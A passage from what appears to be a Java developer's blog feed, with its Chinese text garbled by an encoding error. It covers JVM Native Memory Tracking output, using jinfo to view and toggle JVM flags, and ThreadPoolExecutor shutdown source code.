</span><br><span class="line">-                      Code (reserved=263567KB, committed=87223KB)</span><br><span class="line">                            (malloc=13967KB #19565) </span><br><span class="line">                            (mmap: reserved=249600KB, committed=73256KB) </span><br><span class="line"> </span><br><span class="line">-                        GC (reserved=1849937KB, committed=1849937KB)</span><br><span class="line">                            (malloc=105041KB #121050) </span><br><span class="line">                            (mmap: reserved=1744896KB, committed=1744896KB) </span><br><span class="line"> </span><br><span class="line">-                  Compiler (reserved=13354KB, committed=13354KB)</span><br><span class="line">                            (malloc=3061KB #3484) </span><br><span class="line">                            (arena=10292KB #13)</span><br><span class="line"> </span><br><span class="line">-                  Internal (reserved=813935KB, committed=813935KB)</span><br><span class="line">                            (malloc=813903KB #102254) </span><br><span class="line">                            (mmap: reserved=32KB, committed=32KB) </span><br><span class="line"> </span><br><span class="line">-                    Symbol (reserved=18071KB, committed=18071KB)</span><br><span class="line">                            (malloc=14355KB #138545) </span><br><span class="line">                            (arena=3716KB #1)</span><br><span class="line"> </span><br><span class="line">-    Native Memory Tracking (reserved=7274KB, committed=7274KB)</span><br><span class="line">                            (malloc=298KB #4295) </span><br><span class="line">                            (tracking overhead=6976KB)</span><br><span class="line"> </span><br><span class="line">-               Arena Chunk (reserved=14191KB, committed=14191KB)</span><br><span class="line">                            (malloc=14191KB) </span><br><span class="line"> </span><br><span class="line">-                   Unknown (reserved=90112KB, committed=0KB)</span><br><span class="line">                            (mmap: reserved=90112KB, committed=0KB) </span><br><span class="line"> </span><br><span class="line">Virtual memory map:</span><br><span class="line"> </span><br><span class="line">[0x00007ef481693000 - 0x00007ef481794000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef481794000 - 0x00007ef481895000] reserved and committed 1028KB for Thread Stack from</span><br><span class="line">    [0x00007f0486546f74] JavaThread::run()+0x24</span><br><span class="line">    [0x00007f04863fab88] java_start(Thread*)+0x108</span><br><span class="line"> </span><br><span class="line">[0x00007ef48224d000 - 0x00007ef48244d000] reserved 2048KB for Class from</span><br><span class="line">    [0x00007f0486593c66] ReservedSpace::initialize(unsigned long, unsigned long, bool, char*, unsigned long, bool)+0x256</span><br><span class="line">    [0x00007f0486593d0b] ReservedSpace::ReservedSpace(unsigned long, unsigned long, bool, char*, unsigned long)+0x1b</span><br><span class="line">    [0x00007f0486379cda] VirtualSpaceNode::VirtualSpaceNode(unsigned long)+0x17a</span><br><span class="line">    [0x00007f048637a59a] VirtualSpaceList::create_new_virtual_space(unsigned long)+0x5a</span><br><span class="line"></span><br><span class="line">	[0x00007ef48228d000 - 0x00007ef4823cd000] committed 1280KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a750] VirtualSpaceList::expand_by(unsigned long, unsigned long)+0xf0</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line"></span><br><span class="line">	[0x00007ef48224d000 - 0x00007ef48228d000] committed 256KB from</span><br><span class="line">            [0x00007f0486593549] VirtualSpace::expand_by(unsigned long, bool)+0x199</span><br><span class="line">            [0x00007f0486377936] VirtualSpaceList::expand_node_by(VirtualSpaceNode*, unsigned long, unsigned long)+0x76</span><br><span class="line">            [0x00007f048637a8e3] VirtualSpaceList::get_new_chunk(unsigned long, unsigned long, unsigned long)+0xb3</span><br><span class="line">            [0x00007f048637c432] SpaceManager::grow_and_allocate(unsigned long)+0x2d2</span><br></pre></td></tr></table></figure>
<img src="/2017/12/02/google-perf-tools/memory-mapping.jpg">
<p>å¦‚æœé€šè¿‡ä¸Šè¿°çš„æ˜ å°„å…³ç³»èƒ½ç›´æ¥æ‰¾åˆ°ç³»ç»Ÿçš„<code>StringTable</code>ç­‰å¯¹åº”çš„åˆ†åŒºï¼Œdumpå†…å­˜ä¸‹æ¥åº”è¯¥èƒ½å¾ˆå¿«çš„å‘ç°é—®é¢˜ï¼Œä¸çŸ¥é“è¡Œä¸è¡Œå¾—é€šã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://lovestblog.cn/blog/2015/08/21/rssxmx/" rel="external nofollow noopener noreferrer" target="_blank">è¿›ç¨‹ç‰©ç†å†…å­˜è¿œå¤§äºXmxçš„é—®é¢˜åˆ†æ - ä½ å‡ç¬¨</a></p>
</li>
<li><p><a href="http://lovestblog.cn/blog/2015/05/12/direct-buffer/" rel="external nofollow noopener noreferrer" target="_blank">JVMæºç åˆ†æä¹‹å †å¤–å†…å­˜å®Œå…¨è§£è¯» - ä½ å‡ç¬¨</a></p>
</li>
<li><p><a href="http://calvin1978.blogcn.com/articles/directbytebuffer.html" rel="external nofollow noopener noreferrer" target="_blank">Nettyä¹‹Javaå †å¤–å†…å­˜æ‰«ç›²è´´ | æ±Ÿå—ç™½è¡£</a></p>
</li>
<li><p><a href="http://blog.csdn.net/jicahoo/article/details/50933469" rel="external nofollow noopener noreferrer" target="_blank">Javaå†…å­˜ä¹‹æœ¬åœ°å†…å­˜åˆ†æç¥å™¨ï¼š NMT å’Œ pmap - CSDNåšå®¢</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzA4MTc4NTUxNQ==&amp;mid=2650518452&amp;idx=1&amp;sn=c196bba265f888ed086b7059ca5d3fd2&amp;chksm=8780b470b0f73d66c79b7df96435d48caa8c49a9a6b696e543c0df24e3356202ccde69f2f671&amp;mpshare=1&amp;scene=1&amp;srcid=0831YG589PwShEgNLJ8CKQOp#rd" rel="external nofollow noopener noreferrer" target="_blank">Javaå †å¤–å†…å­˜æ’æŸ¥å°ç»“</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/vm/nmt-8.html" rel="external nofollow noopener noreferrer" target="_blank">Native Memory Tracking</a></p>
</li>
<li><p><a href="https://gperftools.github.io/gperftools/cpuprofile.html" rel="external nofollow noopener noreferrer" target="_blank">Gperftools CPU Profiler</a></p>
</li>
<li><p><a href="http://whosemario.github.io/2016/09/27/google-preftool-1/index.html" rel="external nofollow noopener noreferrer" target="_blank">Google Perftools Mac OS å®‰è£…ä¸ä½¿ç”¨ | Whosemarioçš„å®¶</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> perf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> google-perf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jinfoä½¿ç”¨]]></title>
      <url>http://qsli.github.io/2017/11/26/jinfo/</url>
      <content type="html"><![CDATA[<h2 id="æŸ¥çœ‹æœ€ç»ˆç”Ÿæ•ˆçš„flag"><a href="#æŸ¥çœ‹æœ€ç»ˆç”Ÿæ•ˆçš„flag" class="headerlink" title="æŸ¥çœ‹æœ€ç»ˆç”Ÿæ•ˆçš„flag"></a>æŸ¥çœ‹æœ€ç»ˆç”Ÿæ•ˆçš„flag</h2><p><code>sudo -u tomcat jinfo pid</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Attaching to process ID 30350, please wait...</span><br><span class="line">Debugger attached successfully.</span><br><span class="line">Server compiler detected.</span><br><span class="line">JVM version is 24.45-b08</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">package.access = sun.,org.apache.catalina.,org.apache.coyote.,org.apache.tomcat.,org.apache.jasper.,sun.beans.</span><br><span class="line">sun.cpu.isalist = </span><br><span class="line"></span><br><span class="line">VM Flags:</span><br><span class="line"></span><br><span class="line">-Djava.util.logging.config.file=/tomcat/www/application/conf/logging.properties -Xms6g -Xmx6g -Xmn4g -XX:PermSize=256m -XX:MaxPermSize=256M ... -Djava.io.tmpdir=/tomcat/www/application/temp</span><br></pre></td></tr></table></figure>
<h3 id="java-XX-PrintFlagsFinal"><a href="#java-XX-PrintFlagsFinal" class="headerlink" title="java -XX:+PrintFlagsFinal"></a>java -XX:+PrintFlagsFinal</h3><p>ä½¿ç”¨<code>-version</code>å¯ä»¥æŸ¥çœ‹javaæ”¯æŒçš„å¼€å…³</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -XX:+PrintFlagsFinal -version</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">âœ  qsli.github.com (hexo|âœš6â€¦) java -XX:+PrintFlagsFinal -version</span><br><span class="line">[Global flags]</span><br><span class="line">    uintx AdaptiveSizeDecrementScaleFactor          = 4                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizeMajorGCDecayTimeScale         = 10                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePausePolicy                   = 0                                   &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyCollectionCostMargin    = 50                                  &#123;product&#125;</span><br><span class="line">    uintx AdaptiveSizePolicyInitializingSteps       = 20                                  &#123;product&#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    uintx YoungGenerationSizeSupplementDecay        = 8                                   &#123;product&#125;</span><br><span class="line">    uintx YoungPLABSize                             = 4096                                &#123;product&#125;</span><br><span class="line">     bool ZeroTLAB                                  = false                               &#123;product&#125;</span><br><span class="line">     intx hashCode                                  = 5                                   &#123;product&#125;</span><br><span class="line">java version &quot;1.8.0_112&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_112-b15)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.112-b15, mixed mode)</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯<code>ç™½è¡£å¤§ä¾ </code>è¯´ï¼Œ<code>-version</code>çš„ç»“æœå¯èƒ½ä¸å‡†ç¡®ï¼Œæœ€å¥½å®é™…è·‘ä¸€ä¸‹ã€‚</p>
<blockquote>
<p>ç»å¸¸ä»¥ç±»ä¼¼ä¸‹é¢çš„è¯­å¥å»æŸ¥çœ‹å‚æ•°ï¼Œå·æ‡’ä¸èµ·åº”ç”¨ï¼Œç”¨-versionä»£æ›¿ã€‚æœ‰äº›å‚æ•°è®¾ç½®åä¼šå½±å“å…¶ä»–å‚æ•°ï¼Œæ‰€ä»¥æŸ¥çœ‹æ—¶ä¹ŸæŠŠå®ƒå¸¦ä¸Šã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -server -Xmx1024m -Xms1024m -XX:+UseConcMarkSweepGC -XX:+PrintFlagsFinal -version| grep ParallelGCThreads</span><br></pre></td></tr></table></figure>
<h2 id="åŠ¨æ€æ‰“å¼€jvmçš„å¼€å…³"><a href="#åŠ¨æ€æ‰“å¼€jvmçš„å¼€å…³" class="headerlink" title="åŠ¨æ€æ‰“å¼€jvmçš„å¼€å…³"></a>åŠ¨æ€æ‰“å¼€jvmçš„å¼€å…³</h2><p>jinfoå¯ä»¥åŠ¨æ€çš„æ”¹å˜jvmçš„flagï¼Œ è€Œä¸å¿…é‡å¯æœåŠ¡å™¨ã€‚è™½ç„¶åªå¯¹ä¸€äº›ç‰¹å®šçš„flagæœ‰æ•ˆï¼Œä½†æ˜¯æœ‰çš„æ—¶å€™ä¹Ÿå¾ˆæœ‰ç”¨ã€‚</p>
<p>æ”¯æŒåŠ¨æ€å¼€å¯å’Œå…³é—­çš„çš„flagï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹ã€‚</p>
<p><code>java -XX:+PrintFlagsFinal -version | grep managed</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">qsli.github.com (hexo|âœš6â€¦) java -XX:+PrintFlagsInitial | grep manageable</span><br><span class="line">     intx CMSAbortablePrecleanWaitMillis            = 100                                 &#123;manageable&#125;</span><br><span class="line">     intx CMSTriggerInterval                        = -1                                  &#123;manageable&#125;</span><br><span class="line">     intx CMSWaitDuration                           = 2000                                &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpAfterFullGC                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpBeforeFullGC                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpOnOutOfMemoryError                = false                               &#123;manageable&#125;</span><br><span class="line">    ccstr HeapDumpPath                              =                                     &#123;manageable&#125;</span><br><span class="line">    uintx MaxHeapFreeRatio                          = 70                                  &#123;manageable&#125;</span><br><span class="line">    uintx MinHeapFreeRatio                          = 40                                  &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogram                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramAfterFullGC            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramBeforeFullGC           = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintConcurrentLocks                      = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGC                                   = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDateStamps                         = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDetails                            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCID                                 = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCTimeStamps                         = false                               &#123;manageable&#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨<code>JConsole</code>æ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°ç›¸åº”çš„<code>MXBean</code>èŠ‚ç‚¹:</p>
<img src="/2017/11/26/jinfo/jinfo.png">
<p>ä½¿ç”¨ä»£ç ä¹Ÿå¯ä»¥è·å–å¯¹åº”çš„å€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> afei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2017å¹´07æœˆ25æ—¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DiagnosticOptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HotSpotDiagnostic mxBean = <span class="keyword">new</span> HotSpotDiagnostic();</span><br><span class="line">        List&lt;VMOption&gt; diagnosticVMOptions = mxBean.getDiagnosticOptions();</span><br><span class="line">        <span class="keyword">for</span> (VMOption vmOption:diagnosticVMOptions)&#123;</span><br><span class="line">            System.out.println(vmOption.getName() + <span class="string">" = "</span> + vmOption.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä»£ç æ‹·è´è‡ªå‚è€ƒ1</p>
</blockquote>
<p>ç„¶åå°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œæ‰“å¼€æˆ–è€…å…³é—­ç›¸åº”çš„å¼€å…³</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-flag [+|-]name</span><br><span class="line">            enables or disables the given boolean command line flag.</span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat jinfo -flag  -PrintGC `pgrep -f tomcat`</span><br><span class="line">sudo -u tomcat jinfo -flag  +PrintGC `pgrep -f tomcat`</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://www.jianshu.com/p/c321d0808a1b" rel="external nofollow noopener noreferrer" target="_blank">jinfoå‘½ä»¤è¯¦è§£ - ç®€ä¹¦</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzU3NDAxMzU1Nw==&amp;mid=2247484957&amp;idx=3&amp;sn=ee1e459b6e579555b7006cb69a6bb7f1&amp;chksm=fd39af07ca4e2611707621a71dedfa7329668d741fa2b4bdc9835ef14583cf79adb378d8d6c6&amp;mpshare=1&amp;scene=1&amp;srcid=1123RfpGGNhu1XF30IA20OFH#rd" rel="external nofollow noopener noreferrer" target="_blank">Javaè°ƒä¼˜ç»éªŒè°ˆ</a></p>
</li>
<li><p><a href="http://rednaxelafx.iteye.com/blog/1049240" rel="external nofollow noopener noreferrer" target="_blank">é€šè¿‡jinfoå·¥å…·åœ¨full GCå‰ååšheap dump - Script Ahead, Code Behind - ITeyeåšå®¢</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzODYyNjkzNw==&amp;mid=2247483687&amp;idx=1&amp;sn=41f24dac62c0ca65e4dfe32eae62f3f2&amp;chksm=e9373031de40b927497e5b9aa5dacae6e0a5bac8c760e05ae1d983baf700f45fe8f6c1cfca41&amp;mpshare=1&amp;scene=1&amp;srcid=0904E8auyJdEzKjyytGtjpVO#rd" rel="external nofollow noopener noreferrer" target="_blank">å…³é”®ä¸šåŠ¡ç³»ç»Ÿçš„JVMå‚æ•°æ¨è(2016çƒ­å†¬ç‰ˆï¼‰</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jinfo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[executoræ€»ç»“]]></title>
      <url>http://qsli.github.io/2017/11/19/executor/</url>
      <content type="html"><![CDATA[<h2 id="shutdown-å’ŒshutdownNow"><a href="#shutdown-å’ŒshutdownNow" class="headerlink" title="shutdown()å’ŒshutdownNow()"></a>shutdown()å’ŒshutdownNow()</h2><h3 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown()"></a>shutdown()</h3><p><code>shutdown()</code>ä¼šå°è¯•ä¸­æ–­ç©ºé—²çš„çº¿ç¨‹ï¼Œå¹¶æŠŠ<code>ThreadPool</code>çš„çŠ¶æ€ç½®æˆ<code>SHUTDOWN</code>,<br>è¿™ä¸ªçŠ¶æ€ä¸‹ï¼Œä¸èƒ½é€šè¿‡<code>submit()</code>æˆ–è€…<code>execute()</code>æäº¤ä»»åŠ¡ï¼Œä½†æ˜¯æ­£åœ¨æ‰§è¡Œçš„å’Œä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡è¿˜å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">    mainLock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        checkShutdownAccess();</span><br><span class="line">        advanceRunState(SHUTDOWN);</span><br><span class="line">        interruptIdleWorkers();</span><br><span class="line">        onShutdown(); <span class="comment">// hook for ScheduledThreadPoolExecutor</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        mainLock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    tryTerminate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»»åŠ¡é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡æ‹‰å–, é€šè¿‡<code>getTask()</code>æ–¹æ³•è¿›è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">runWorker</span><span class="params">(Worker w)</span> </span>&#123;</span><br><span class="line">      Thread wt = Thread.currentThread();</span><br><span class="line">      Runnable task = w.firstTask;</span><br><span class="line">      w.firstTask = <span class="keyword">null</span>;</span><br><span class="line">      w.unlock(); <span class="comment">// allow interrupts</span></span><br><span class="line">      <span class="keyword">boolean</span> completedAbruptly = <span class="keyword">true</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">while</span> (task != <span class="keyword">null</span> || (task = getTask()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">              w.lock();</span><br><span class="line">              <span class="comment">// If pool is stopping, ensure thread is interrupted;</span></span><br><span class="line">              <span class="comment">// if not, ensure thread is not interrupted.  This</span></span><br><span class="line">              <span class="comment">// requires a recheck in second case to deal with</span></span><br><span class="line">              <span class="comment">// shutdownNow race while clearing interrupt</span></span><br><span class="line">              <span class="keyword">if</span> ((runStateAtLeast(ctl.get(), STOP) ||</span><br><span class="line">                   (Thread.interrupted() &amp;&amp;</span><br><span class="line">                    runStateAtLeast(ctl.get(), STOP))) &amp;&amp;</span><br><span class="line">                  !wt.isInterrupted())</span><br><span class="line">                  wt.interrupt();</span><br><span class="line">              <span class="keyword">try</span> &#123;</span><br><span class="line">                  beforeExecute(wt, task);</span><br><span class="line">                  Throwable thrown = <span class="keyword">null</span>;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      task.run();</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (RuntimeException x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Error x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> x;</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (Throwable x) &#123;</span><br><span class="line">                      thrown = x; <span class="keyword">throw</span> <span class="keyword">new</span> Error(x);</span><br><span class="line">                  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                      afterExecute(task, thrown);</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                  task = <span class="keyword">null</span>;</span><br><span class="line">                  w.completedTasks++;</span><br><span class="line">                  w.unlock();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          completedAbruptly = <span class="keyword">false</span>;</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          processWorkerExit(w, completedAbruptly);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="shutdownNow"><a href="#shutdownNow" class="headerlink" title="shutdownNow()"></a>shutdownNow()</h3><p><code>shutdownNow()</code>ä¼šä¸­æ–­æ‰€æœ‰çš„<code>worker</code>çº¿ç¨‹ï¼Œ ç„¶åå°†é˜Ÿåˆ—é‡Œæ²¡æœ‰æ‰§è¡Œçš„ä»»åŠ¡å…¨éƒ¨åœæ­¢å¹¶è¿”å›ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Runnable&gt; <span class="title">shutdownNow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       List&lt;Runnable&gt; tasks;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           checkShutdownAccess();</span><br><span class="line">           advanceRunState(STOP);</span><br><span class="line">           interruptWorkers();</span><br><span class="line">           tasks = drainQueue();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">       tryTerminate();</span><br><span class="line">       <span class="keyword">return</span> tasks;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸­æ–­çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Interrupts all threads, even if active. Ignores SecurityExceptions</span></span><br><span class="line"><span class="comment">    * (in which case some threads may remain uninterrupted).</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">interruptWorkers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">       mainLock.lock();</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">               w.interruptIfStarted();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           mainLock.unlock();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">interruptIfStarted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           Thread t;</span><br><span class="line">           <span class="keyword">if</span> (getState() &gt;= <span class="number">0</span> &amp;&amp; (t = thread) != <span class="keyword">null</span> &amp;&amp; !t.isInterrupted()) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   t.interrupt();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (SecurityException ignore) &#123;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
<p>åœæ­¢ä»»åŠ¡é˜Ÿåˆ—ä¸­æ²¡æœ‰æ‰§è¡Œçš„ä»»åŠ¡</p>
